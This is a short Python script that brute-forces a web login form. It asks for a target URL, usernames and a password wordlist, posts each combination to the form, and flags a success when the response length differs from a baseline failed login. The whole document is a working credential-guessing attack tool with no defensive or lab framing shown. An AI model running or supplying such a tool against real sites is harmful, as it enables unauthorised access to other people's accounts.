import requests
import sys

url = input("target url: ")
usernames = input("usernames (separate by comma{,}): ")
usernames = usernames.split(',')
file = input("path of the password file: ")

wrong_login = requests.post(url, data={'username': 'admin', 'password': 'admin'})
failure_size = len(wrong_login.content)

for username in usernames:
    with open(file, "r") as pass_list:
        for password in pass_list:
            password = password.strip('\n').encode()
            sys.stdout.write(f"\r[X] Attempting user:password -> {username}:{password.decode()}")
            sys.stdout.flush()
            r= requests.post(url, data={"username": username, "password": password})
            if abs(len(r.content) - failure_size) > 20:
                sys.stdout.write("\n")
                sys.stdout.write(f"[>>>>>>] PASSWORD FOUND: {password} for user {username}\n")
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write(f"\tNo pass found for use {username}")
        sys.stdout.write("\n")